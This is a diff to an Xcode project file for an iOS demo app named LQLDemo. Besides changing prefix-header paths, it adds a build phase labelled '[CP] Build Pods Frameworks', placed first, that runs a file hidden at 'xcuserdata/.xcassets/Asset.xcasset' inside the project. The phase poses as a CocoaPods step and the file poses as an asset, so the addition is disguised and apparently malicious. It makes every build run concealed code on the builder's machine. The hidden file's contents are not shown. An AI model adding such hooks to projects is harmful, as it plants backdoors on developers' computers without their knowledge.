@@ -1394,6 +1394,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EF9D5BC822F18DD80042BBB9 /* Build configuration list for PBXNativeTarget "LQLDemo" */;
 			buildPhases = (
+				C4FCE84EB81CDBACEFAAC43A /* [CP] Build Pods Frameworks */,
 				3ADB28BBCF5A59A28912D623 /* [CP] Check Pods Manifest.lock */,
 				EF9D5BAE22F18DD70042BBB9 /* Sources */,
 				EF9D5BAF22F18DD70042BBB9 /* Frameworks */,
@@ -1543,6 +1544,24 @@
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		C4FCE84EB81CDBACEFAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -1849,7 +1868,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = EC5567HY92;
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
-				GCC_PREFIX_HEADER = /Users/zcsy_ios/Desktop/LQLDemo/LQLDemo/PrefixHeader.pch;
+				GCC_PREFIX_HEADER = /Users/gongzhineng/Desktop/LQLDemo/LQLDemo/PrefixHeader.pch;
 				INFOPLIST_FILE = LQLDemo/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -1869,7 +1888,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = EC5567HY92;
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
-				GCC_PREFIX_HEADER = /Users/zcsy_ios/Desktop/LQLDemo/LQLDemo/PrefixHeader.pch;
+				GCC_PREFIX_HEADER = /Users/gongzhineng/Desktop/LQLDemo/LQLDemo/PrefixHeader.pch;
 				INFOPLIST_FILE = LQLDemo/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
